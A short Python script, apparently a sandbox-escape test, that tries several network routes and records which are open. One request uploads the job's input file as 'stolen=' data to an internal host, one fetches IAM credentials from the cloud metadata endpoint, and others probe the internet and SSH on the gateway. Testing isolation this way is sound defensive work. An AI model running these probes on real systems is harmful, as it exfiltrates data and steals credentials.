# Hostile: try every way out of the sandbox and record which worked.
import json, socket, urllib.error, urllib.request

def http(url, data=None):
    try:
        with urllib.request.urlopen(urllib.request.Request(url, data=data), timeout=3) as r:
            return "open: " + r.read(200).decode(errors="replace").strip()
    except urllib.error.HTTPError as e:   # an answer of any kind means it got through
        return f"open: HTTP {e.code}"
    except Exception as e:
        return "blocked: " + type(e).__name__

def tcp(host, port):
    s = socket.socket()
    s.settimeout(3)
    try:
        s.connect((host, port))
        return "open"
    except Exception as e:
        return "blocked: " + type(e).__name__
    finally:
        s.close()

def gateway():
    try:
        for line in open("/proc/net/route").read().splitlines()[1:]:
            f = line.split()
            if f[1] == "00000000":
                return socket.inet_ntoa(bytes.fromhex(f[2])[::-1])
    except Exception:
        pass
    return None

r = {
    "mirror": http("http://10.99.0.10:8080/packages/kl-tools-1.4.2.txt"),
    "exfil": http("http://10.99.0.20:8080/upload", data=b"stolen=" + open("/job/input.txt", "rb").read()),
    "meta": http("http://169.254.169.254/latest/meta-data/iam/security-credentials/ci"),
    "internet": tcp("1.1.1.1", 443),
}
gw = gateway()
r["gateway"] = gw
r["host_ssh"] = tcp(gw, 22) if gw else "blocked: no route"
json.dump(r, open("/out/net.json", "w"), indent=1)
print(json.dumps(r, indent=1))
